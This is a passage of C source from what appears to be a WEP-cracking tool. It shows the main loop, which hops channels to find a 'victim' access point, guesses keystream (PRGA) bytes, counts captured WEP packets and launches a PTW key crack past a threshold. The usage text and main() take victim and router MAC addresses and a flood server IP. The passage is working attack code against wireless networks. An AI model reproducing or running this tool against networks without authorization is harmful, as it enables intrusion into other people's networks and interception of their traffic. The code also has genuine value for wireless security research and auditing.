				if (state == FIND_VICTIM)
					time_print("Chan %.02d %c\r", chaninfo.chan, *pbarp);
				else if (decryptstate.cipher) {
					int pos = decryptstate.prgainfo.len - 1;
					unsigned char prga = decryptstate.prgainfo.prga[pos];
					assert(pos);

					time_print("Guessing PRGA %.2x (IP byte=%d)    \r",
						   prga, decryptstate.cipher[pos] ^ prga);
				}
				else
					time_print("%c\r", *pbarp);
				fflush(stdout);
			}
			memcpy(&last_status, &now,sizeof(last_status));	
		}

		// check if we are cracking
		if (crack_pid) {
			if (now.tv_sec - crack_start.tv_sec >= crack_dur)
				kill_crack();
		}

		// check TX  / retransmit
		if (txstate.waiting_ack) {
			unsigned int elapsed = now.tv_sec -
					       txstate.tsent.tv_sec;
			elapsed *= 1000*1000;
			elapsed += (now.tv_usec - txstate.tsent.tv_usec);

			if (elapsed >= ack_timeout)
				send_frame(wifd, NULL, -1);
		}

		// INPUT
		// select
		FD_ZERO(&rfd);
		FD_SET(wifd, &rfd);
		FD_SET(tapfd, &rfd);
		tv.tv_sec = 0;
		tv.tv_usec = 1000*10;
		rd = select(largest+1, &rfd, NULL, NULL, &tv);
		if (rd == -1) {
			perror("select()");
			exit(1);
		}

		// read
		if (rd != 0) {
			// wifi
			if (FD_ISSET(wifd, &rfd)) {
				rd = read_packet(wifd, buf, sizeof(buf));
				if (rd == 0)
					return;
				if (rd == -1) {
					perror("read()");
					exit(1);
				}

				pbarp++;
				if(!(*pbarp))
					pbarp = &pbar[0];
				// input
				anal(buf, rd, wifd);
			}

			// tap
			if (FD_ISSET(tapfd, &rfd)) {
				read_tap();
			}
		}

		// check state and what we do next.
		if (state == FIND_VICTIM) {
			if (now.tv_sec > lasthop.tv_sec ||
			    ( (now.tv_usec - lasthop.tv_usec) >= 300*1000 )) {
				int chan = chaninfo.chan;
				chan++;

				if(chan > max_chan)
					chan = 1;
				
				set_chan(chan);
				memcpy(&lasthop, &now, sizeof(lasthop));
			}    
		} else {
		// check if we need to write something...	
			if (!txstate.waiting_ack)
				can_write(wifd);

			// roughly!

#ifdef MORE_ACCURATE			
			if ( (now.tv_sec - last_wcount.tv_sec) >= 2) {
				unsigned int elapsed;
				int secs;
				int packetz = weplog.packets - last_wep_count;
				elapsed = 1000*1000;

				elapsed -= last_wcount.tv_usec;
				
				assert(elapsed >= 0);
				elapsed += now.tv_usec;

				secs = now.tv_sec - last_wcount.tv_sec;
				secs--;
				if (secs > 0)
					elapsed += (secs*1000*1000);

				weplog.rate = (int)
				((double)packetz/(elapsed/1000.0/1000.0));	
#else
			if ( now.tv_sec > last_wcount.tv_sec) {
				weplog.rate = weplog.packets - last_wep_count;
#endif				
				last_wep_count = weplog.packets;
				memcpy(&last_wcount, &now, sizeof(now));

				if (wep_thresh != -1 && weplog.packets > wep_thresh)
					try_crack();
			}
		}
	}
}

void start(char *dev) {
	int fd;

	setup_if(dev);

	fd = open_bpf(dev, DLT_IEEE802_11_RADIO);

	ptw = PTW_newattackstate();
	if (!ptw)
		err(1, "PTW_newattackstate()");

	own(fd);

#if 0
	{
		int i;
		struct timeval tv;
		set_chan(11);
		for (i = 0; i < 10; i++) {
			gettimeofday(&tv, NULL);

			send_ack(tx);
//			usleep(500);
			printf("%lu\n", tv.tv_usec);
		}	
	}	
#endif

	close(fd);
}

void usage(char* pname) {
	printf("Usage: %s <opts>\n", pname);
	printf("-h\t\tthis lame message\n");
	printf("-i\t\t<iface>\n");
	printf("-s\t\t<flood server ip>\n");
	printf("-m\t\t<my ip>\n");
	printf("-n\t\t<net ip>\n");
	printf("-r\t\t<rtr mac>\n");
	printf("-a\t\t<mymac>\n");
	printf("-c\t\tdo not crack\n");
	printf("-p\t\t<min prga>\n");
	printf("-4\t\t64 bit key\n");
	printf("-v\t\tvictim mac\n");
	printf("-t\t\t<crack thresh>\n");
	printf("-f\t\t<max chan>\n");
	exit(0);
}

void str2mac(unsigned char* dst, unsigned char* mac) {
	unsigned int macf[6];
	int i;

	if( sscanf(mac, "%x:%x:%x:%x:%x:%x",
                   &macf[0], &macf[1], &macf[2],
                   &macf[3], &macf[4], &macf[5]) != 6) {

		   printf("can't parse mac %s\n", mac);
		   exit(1);
	}     

	for (i = 0; i < 6; i++)
		*dst++ = (unsigned char) macf[i];
}

int main(int argc, char *argv[]) {
	unsigned char* dev = "ath0";
	unsigned char rtr[6];
	unsigned char vic[6];

	int ch;

	if (gettimeofday(&real_start, NULL) == -1) {
		perror("gettimeofday()");
		exit(1);
	}

	chaninfo.s = -1;
	victim.ssid = 0;
	prgainfo.len = 0;

	memset(&txstate, 0, sizeof(txstate));
	memset(&fragstate, 0, sizeof(fragstate));
	memset(&decryptstate, 0, sizeof(decryptstate));
	memset(&weplog, 0, sizeof(weplog));

	state = FIND_VICTIM;

	while ((ch = getopt(argc, argv, "hi:s:m:r:a:n:cp:4v:t:f:")) != -1) {
		switch (ch) {
			case 'a':
				str2mac(mymac, optarg);
				break;

			case 's':
				floodip = optarg;
				break;

			case 'i':
				dev = optarg;
				break;

			case 'm':
				strncpy(myip, optarg, sizeof(myip)-1);
				myip[sizeof(myip)-1] = 0;
				break;

			case 'n':
				netip = optarg;
				netip_arg = 1;
				break;

			case 'r':
				str2mac(rtr, optarg);
				rtrmac = rtr;
				break;

			case 'v':
				str2mac(vic, optarg);
				victim_mac = vic;
				break;

			case 'c':
				wep_thresh = -1;
				break;

			case 'p':
				min_prga = atoi(optarg);
				break;

			case 't':
				thresh_incr = wep_thresh = atoi(optarg);
				break;

			case 'f':
				max_chan = atoi(optarg);
				break;

			case '4':
				bits = 64;
				break;
			
			default:
				usage(argv[0]);
				break;
		}
	}

	start(dev);
	
	if(chaninfo.s != -1)
		close(chaninfo.s);
	if(victim.ssid)
		free(victim.ssid);
	exit(0);
}
